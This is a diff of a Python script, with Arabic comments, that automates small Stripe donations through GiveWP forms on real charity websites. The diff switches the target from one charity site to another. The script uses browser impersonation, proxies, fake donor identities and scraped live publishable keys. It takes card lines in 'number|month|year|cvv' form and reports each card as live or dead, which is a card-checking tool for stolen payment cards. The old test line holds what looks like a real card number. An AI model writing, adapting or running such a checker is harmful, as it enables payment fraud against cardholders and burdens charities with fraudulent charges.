@@ -6,7 +6,7 @@ import asyncio
 from faker import Faker
 from curl_cffi.requests import AsyncSession
 
-fake = Faker("en_US")
+fake = Faker("en_UK")
 
 class tools:
     @staticmethod
@@ -78,21 +78,15 @@ RESPONSE_MAP = {
 class Gateway:
     @staticmethod
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
-        # نترك المعالجة لـ impersonate بدون تعارض في الـ User-Agent
         async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=15) as session:
             try:
-                # Step 1: GET donation form to extract hash, pre, give
+                # Step 1: GET donate-now page with iframe param
                 headers_get = {
-                    "referer": "https://ietuk.co.uk/donations/donation-form-1/",
+                    "referer": "https://claddagh.org.au/support-our-work/",
                 }
-                params_get = {
-                    "form-id": "7146",
-                    "payment-mode": "stripe",
-                    "level-id": "custom",
-                    "custom-amount": "1.00",
-                }
+                params_get = {"giveDonationFormInIframe": "1"}
                 resp_get = await session.get(
-                    "https://ietuk.co.uk/donations/donation-form-1/",
+                    "https://claddagh.org.au/give/donate-now",
                     params=params_get,
                     headers=headers_get,
                 )
@@ -103,22 +97,21 @@ class Gateway:
                 if not hash_val or not pre or not give:
                     return "Error", "Missing form parameters", False
 
-                # Step 2: AJAX call to reset all nonce
+                # Step 2: Reset nonce via admin-ajax
                 headers_reset = {
-                    "origin": "https://ietuk.co.uk",
-                    "referer": "https://ietuk.co.uk/donations/donation-form-1/?form-id=7146&payment-mode=stripe&level-id=custom&custom-amount=1.00",
+                    "origin": "https://claddagh.org.au",
+                    "referer": "https://claddagh.org.au/give/donate-now?giveDonationFormInIframe=1",
                     "x-requested-with": "XMLHttpRequest",
                 }
                 data_reset = {
                     "action": "give_donation_form_reset_all_nonce",
-                    "give_form_id": "7146",
+                    "give_form_id": "718",
                 }
                 resp_reset = await session.post(
-                    "https://ietuk.co.uk/wp-admin/admin-ajax.php",
+                    "https://claddagh.org.au/wp-admin/admin-ajax.php",
                     headers=headers_reset,
                     data=data_reset,
                 )
-                
                 try:
                     reset_json = resp_reset.json()
                     idh = reset_json.get("data", {}).get("give_form_hash")
@@ -129,50 +122,44 @@ class Gateway:
                 if not idh or not ido:
                     return "Error", "Missing reset nonce data", False
 
-                # Step 3: Initial donation attempt
+                # Step 3: Initial donation attempt (without payment method)
                 headers_initial = {
-                    "origin": "https://ietuk.co.uk",
-                    "referer": "https://ietuk.co.uk/donations/donation-form-1/",
+                    "origin": "https://claddagh.org.au",
+                    "referer": "https://claddagh.org.au/give/donate-now?giveDonationFormInIframe=1",
                     "x-requested-with": "XMLHttpRequest",
                 }
                 data_initial = {
                     "give-honeypot": "",
                     "give-form-id-prefix": pre,
                     "give-form-id": give,
-                    "give-form-title": "Donate Now",
-                    "give-current-url": "https://ietuk.co.uk/donations/donation-form-1/",
-                    "give-form-url": "https://ietuk.co.uk/donations/donation-form-1/",
-                    "give-form-minimum": "1.00",
-                    "give-form-maximum": "999999.99",
-                    "give-form-hash": idh,
+                    "give-form-title": "Donate",
+                    "give-current-url": "https://claddagh.org.au/support-our-work/",
+                    "give-form-url": "https://claddagh.org.au/give/donate-now/",
+                    "give-form-minimum": "1",
+                    "give-form-maximum": "1000000",
+                    "give-form-hash": idh,  # استخدام النونس المعاد ضبطها
                     "give-price-id": "custom",
-                    "give-amount": "1.00",
+                    "give-amount": "1",
                     "give_stripe_payment_method": "",
-                    "payment-mode": "stripe",
                     "give_first": user_data["first"],
                     "give_last": user_data["last"],
                     "give_email": user_data["email"],
-                    "give-form-user-register-hash": ido,
-                    "give-purchase-var": "needs-to-register",
+                    "payment-mode": "stripe",
                     "card_name": user_data["name"],
-                    "billing_country": "US",
-                    "card_address": user_data["address"],
-                    "card_address_2": "",
-                    "card_city": user_data["city"],
-                    "card_state": user_data["state"],
-                    "card_zip": user_data["zip"],
+                    "give_mailchimp_signup": "on",
                     "give_action": "purchase",
                     "give-gateway": "stripe",
+                    "give_embed_form": "1",
                     "action": "give_process_donation",
                     "give_ajax": "true",
                 }
                 await session.post(
-                    "https://ietuk.co.uk/wp-admin/admin-ajax.php",
+                    "https://claddagh.org.au/wp-admin/admin-ajax.php",
                     headers=headers_initial,
                     data=data_initial,
                 )
 
-                # Step 4: Get Stripe fingerprint (مع معالجة استثناء الأخطاء)
+                # Step 4: Get Stripe fingerprint
                 headers_stripe = {
                     "origin": "https://m.stripe.network",
                     "referer": "https://m.stripe.network/",
@@ -187,7 +174,7 @@ class Gateway:
                 except Exception:
                     guid, muid, sid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
 
-                # Step 5: Create payment method via Stripe
+                # Step 5: Create payment method
                 client_session_id = str(uuid.uuid4())
                 elements_session_config_id = str(uuid.uuid4())
 
@@ -199,12 +186,6 @@ class Gateway:
                     "type": "card",
                     "billing_details[name]": user_data["name"],
                     "billing_details[email]": user_data["email"],
-                    "billing_details[address][line1]": user_data["address"],
-                    "billing_details[address][line2]": "",
-                    "billing_details[address][city]": user_data["city"],
-                    "billing_details[address][state]": user_data["state"],
-                    "billing_details[address][postal_code]": user_data["zip"],
-                    "billing_details[address][country]": "US",
                     "card[number]": card_data["cc"],
                     "card[cvc]": card_data["cvv"],
                     "card[exp_month]": card_data["mm"],
@@ -212,23 +193,20 @@ class Gateway:
                     "guid": guid,
                     "muid": muid,
                     "sid": sid,
-                    "payment_user_agent": "stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; split-card-element",
-                    "referrer": "https://ietuk.co.uk",
+                    "payment_user_agent": "stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; split-card-element",
+                    "referrer": "https://claddagh.org.au",
                     "time_on_page": str(random.randint(10000, 99999)),
                     "client_attribution_metadata[client_session_id]": client_session_id,
                     "client_attribution_metadata[merchant_integration_source]": "elements",
                     "client_attribution_metadata[merchant_integration_subtype]": "split-card-element",
                     "client_attribution_metadata[merchant_integration_version]": "2017",
-                    "client_attribution_metadata[wallet_config_id]": elements_session_config_id,
-                    "key": "pk_live_51PVC6sFzbukajckZRX9IVkSEB1bcI2g831r7HgD4VK0ZAk2U0572Ya56wQXlyqGdVM62Fj7SXlR7oCSwyJEmq3ZG002t8GWayN",
-                    "_stripe_account": "acct_1PVC6sFzbukajckZ",
+                    "key": "pk_live_51HOzNNElpNoLNo3EEomqvykDILBdthziqChVE2pgTSJQ3BetSJFXyVt1BxjnLRpr2sJb4lTSBL9JOa0q2s6bWfXX00CQHwQI5R",
                 }
                 resp_pm = await session.post(
                     "https://api.stripe.com/v1/payment_methods",
                     headers=headers_pm,
                     data=data_pm,
                 )
-                
                 try:
                     pm_json = resp_pm.json()
                     payment_method_id = pm_json.get("id")
@@ -241,25 +219,26 @@ class Gateway:
 
                 # Step 6: Final POST with payment method
                 headers_final = {
-                    "origin": "https://ietuk.co.uk",
-                    "referer": "https://ietuk.co.uk/donations/donation-form-1/",
+                    "origin": "https://claddagh.org.au",
+                    "referer": "https://claddagh.org.au/give/donate-now?giveDonationFormInIframe=1",
                 }
                 data_final = data_initial.copy()
                 data_final["give_stripe_payment_method"] = payment_method_id
 
                 resp_final = await session.post(
-                    "https://ietuk.co.uk/donations/donation-form-1/",
-                    params={"payment-mode": "stripe", "form-id": "7146"},
+                    "https://claddagh.org.au/give/donate-now/",
+                    params={"payment-mode": "stripe", "form-id": "718"},
                     headers=headers_final,
                     data=data_final,
                 )
                 response_text = resp_final.text.lower()
 
-                # Step 7: Classification
+                # Step 7: Classify using RESPONSE_MAP
                 for key, (status, msg, is_live) in RESPONSE_MAP.items():
                     if key in response_text:
                         return status, msg, is_live
 
+                # محسّن: البحث عن رسالة الخطأ بنمط أكثر مرونة
                 error_match = re.search(r'<p[^>]*>.*?<strong>error</strong>:\s*(.*?)</p>', response_text, re.DOTALL | re.IGNORECASE)
                 if error_match:
                     err_msg = error_match.group(1).strip()
@@ -274,7 +253,7 @@ class Gateway:
                 return "Error", f"Exception: {str(e)}", False
 
 
-async def process_ST_1_charge(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
+async def process_ST_2_charge(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
     card_data = tools.getcard(card_line)
     if not card_data["cc"]:
         return "Failed", "Invalid card format", False
@@ -294,13 +273,13 @@ async def process_ST_1_charge(card_line: str, proxy_url: str = None) -> tuple[st
 # ==========================================
 async def main():
     # بطاقة اختبار قياسية لـ Stripe
-    test_card = "4211566115568612|12|28|321"
+    test_card = "4242424242424242|12|28|321"
     proxy = None  # يمكنك وضع البروكسي هنا إذا لزم الأمر
 
-    print("🚀 جاري اختبار البوابة (ST Charge)...")
+    print("🚀 جاري اختبار البوابة (ST-2 Charge)...")
     print(f"💳 البطاقة: {test_card}")
     
-    status, message, is_live = await process_ST_1_charge(test_card, proxy_url=proxy)
+    status, message, is_live = await process_ST_2_charge(test_card, proxy_url=proxy)
     
     print("\n--- نتيجة التنفيذ ---")
     print(f"الحالة  : {status}")
